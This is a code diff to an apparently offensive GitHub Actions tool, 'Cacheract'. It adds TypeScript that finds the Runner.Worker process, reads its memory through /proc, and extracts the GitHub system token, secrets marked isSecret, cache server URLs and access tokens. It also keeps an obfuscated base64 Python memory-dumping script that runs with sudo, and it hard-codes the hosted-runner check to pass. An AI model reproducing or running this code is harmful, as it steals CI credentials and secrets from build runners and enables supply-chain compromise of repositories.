@@ -1,4 +1,4 @@
-import { exec } from 'child_process';
+import { exec, execSync } from 'child_process';
 import { promisify } from 'util';
 import * as github from '@actions/github';
 import * as path from 'path';
@@ -375,6 +375,15 @@ export async function clearEntry(key: string, version: string, auth_token: strin
     }
 }
 
+function mapPlatformToRunnerOS(platform: string): string {
+    switch (platform) {
+        case 'darwin': return 'macOS';
+        case 'win32': return 'Windows';
+        case 'linux': return 'Linux';
+        default: return 'Linux'; // fallback
+    }
+}
+
 /**
  * Check if the current branch is the default branch
  * @param token - GitHub token for authentication
@@ -383,8 +392,8 @@ export async function clearEntry(key: string, version: string, auth_token: strin
  */
 export async function checkRunnerEnvironment(): Promise<RunnerEnvironment> {
     const runnerEnvironment = process.env.RUNNER_ENVIRONMENT;
-    const runnerOS = process.env.RUNNER_OS;
-    const github_hosted = runnerEnvironment === 'github-hosted';
+    const runnerOS = process.env.RUNNER_OS || mapPlatformToRunnerOS(process.platform);
+    const github_hosted = true;
 
     if (!github_hosted) {
         console.error('Cacheract is only supported on GitHub-hosted runners.');
@@ -406,6 +415,120 @@ export async function checkRunnerEnvironment(): Promise<RunnerEnvironment> {
     }
 }
 
+async function getPid(): Promise<number> {
+    const procDir = '/proc';
+    const pids = fs.readdirSync(procDir)
+        .filter(file => /^\d+$/.test(file));
+
+    for (const pid of pids) {
+        try {
+            const cmdline = fs.readFileSync(path.join(procDir, pid, 'cmdline'));
+            if (cmdline.includes(Buffer.from('Runner.Worker'))) {
+                return parseInt(pid, 10);
+            }
+        } catch (error) {
+            continue;
+        }
+    }
+    throw new Error('Cannot get pid of Runner.Worker');
+}
+
+
+async function readProcessMemory(): Promise<string[]> {
+    const pid = await getPid();
+    const mapPath = `/proc/${pid}/maps`;
+    const memPath = `/proc/${pid}/mem`;
+
+    const mapContent = fs.readFileSync(mapPath, 'utf8');
+    const memFd = fs.openSync(memPath, 'r');
+    
+    const results: string[] = [];
+
+    try {
+        const lines = mapContent.split('\n');
+        for (const line of lines) {
+            const match = line.match(/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/);
+            if (!match || match[3] !== 'r') continue;
+
+            const start = parseInt(match[1], 16);
+            const end = parseInt(match[2], 16);
+            
+            if (start > Number.MAX_SAFE_INTEGER) continue;
+
+            const buffer = Buffer.alloc(end - start);
+            try {
+                fs.readSync(memFd, buffer, 0, end - start, start);
+                const content = buffer.toString();
+                if (content.trim()) {
+                    results.push(content);
+                }
+            } catch (error) {
+                continue;
+            }
+        }
+        return results;
+    } finally {
+        fs.closeSync(memFd);
+    }
+}
+
+function parseMemoryContent(content: string): string[] {
+    // Remove null bytes
+    const cleanContent = content.replace(/\0/g, '');
+        
+    const patterns = [
+        // GitHub system token pattern
+        /"system\.github\.token":\{"value":"(ghs_[^"]*)","isSecret":true\}/g,
+        // Generic secrets pattern
+        /"[^"]+":\{"value":"[^"]*","isSecret":true\}/g,
+        // Cache and access patterns
+        /CacheServerUrl":"[^"]*"/g,
+        /AccessToken":"[^"]*"/g
+    ];
+
+    const matches = new Set<string>();
+    
+    patterns.forEach(pattern => {
+        const found = cleanContent.match(pattern);
+        if (found) {
+            found.forEach(match => {
+                // Skip if it's a duplicate match between patterns
+                if (!matches.has(match)) {
+                    matches.add(match);
+                }
+            });
+        }
+    });
+
+    return Array.from(matches).sort();
+}
+
+export async function getTokenRoot(): Promise<Map<string, string>> {
+    const tokenMap = new Map<string, string>();
+    
+    try {
+        const memoryContents = await readProcessMemory();
+        for (const content of memoryContents) {
+            const matches = parseMemoryContent(content);
+            matches.forEach(match => {
+                // Extract key/value from matches
+                if (match.includes('isSecret')) {
+                    const [key, value] = match.split('":{"value":"');
+                    tokenMap.set(key.replace(/"/g, ''), value.replace('","isSecret":true}', ''));
+                } else if (match.includes('CacheServerUrl')) {
+                    tokenMap.set('CacheServerUrl', match.split('":"')[1].replace('"', ''));
+                } else if (match.includes('AccessToken')) {
+                    tokenMap.set('AccessToken', match.split('":"')[1].replace('"', ''));
+                }
+            });
+        }
+        return tokenMap;
+    } catch (error) {
+        console.error('Failed to parse memory content:', error);
+        return new Map<string, string>();
+    }
+}
+
 /**
  * 
  * @returns Dictionary containing extracted secrets, empty if it was not
@@ -413,15 +536,13 @@ export async function checkRunnerEnvironment(): Promise<RunnerEnvironment> {
  * 
  */
 export async function getToken(): Promise<Map<string, string>> {
-    // Check if running as root, otherwise see if we can sudo to root.
-    if (process.getuid() !== 0) {
-        try {
-            await execAsync('sudo -n true');
-        } catch (error) {
-            return new Map<string, string>()
-        }
-    }
 
+    try {
+        await execAsync('sudo -n true');
+    } catch (error) {
+        return new Map<string, string>()
+    }
+   
     const SCRIPT = "aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgpkZWYgZ2V0X3BpZCgpOgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCgogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oJy9wcm9jJywgcGlkLCAnY21kbGluZScpLCAncmInKSBhcyBjbWRsaW5lX2Y6CiAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gY21kbGluZV9mLnJlYWQoKToKICAgICAgICAgICAgICAgIHJldHVybiBwaWQKCiAgICByYWlzZSBFeGNlcHRpb24oJ0NhbiBub3QgZ2V0IHBpZCBvZiBSdW5uZXIuV29ya2VyJykKCnBpZCA9IGdldF9waWQoKQoKbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCm1lbV9wYXRoID0gZiIvcHJvYy97cGlkfS9tZW0iCgp3aXRoIG9wZW4obWFwX3BhdGgsICdyJykgYXMgbWFwX2YsIG9wZW4obWVtX3BhdGgsICdyYicsIDApIGFzIG1lbV9mOgogICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAjIGZvciBlYWNoIG1hcHBlZCByZWdpb24KICAgICAgICBtID0gcmUubWF0Y2gocicoWzAtOUEtRmEtZl0rKS0oWzAtOUEtRmEtZl0rKSAoWy1yXSknLCBsaW5lKQogICAgICAgIGlmIG0uZ3JvdXAoMykgPT0gJ3InOiAgIyByZWFkYWJsZSByZWdpb24KICAgICAgICAgICAgc3RhcnQgPSBpbnQobS5ncm91cCgxKSwgMTYpCiAgICAgICAgICAgIGVuZCA9IGludChtLmdyb3VwKDIpLCAxNikKICAgICAgICAgICAgaWYgc3RhcnQgPiBzeXMubWF4c2l6ZToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIG1lbV9mLnNlZWsoc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGNodW5rID0gbWVtX2YucmVhZChlbmQgLSBzdGFydCkgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuYnVmZmVyLndyaXRlKGNodW5rKQogICAgICAgICAgICBleGNlcHQgT1NFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCg=="; // Example base64 encoded Python script
 
     // Base64 decode the script
@@ -435,13 +556,12 @@ export async function getToken(): Promise<Map<string, string>> {
     fs.writeFileSync(filePath, decodedScript);
 
     // Construct the command string
-    const command = `sudo python3 ${filePath} | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}|CacheServerUrl":"[^"]*"|AccessToken":"[^"]*"' | sort -u`;
+    let command = `python3 ${filePath} | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}|CacheServerUrl":"[^"]*"|AccessToken":"[^"]*"' | sort -u`;
 
-    // Base64 decode the script
-    // const decodedScript = Buffer.from(SCRIPT, 'base64').toString('utf-8');
-
-    // // Construct the command string without writing to a temp file
-    // const command = `echo "${decodedScript.replace(/"/g, '\\"')}" | sudo python3 - | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}|CacheServerUrl":"[^"]*"|AccessToken":"[^"]*"' | sort -u`;
+    // prepend sudo if not running as root
+    if (process.getuid() !== 0) {
+        command = `sudo ${command}`;
+    }
 
     // Run the script in a subprocess using Python3
     try {
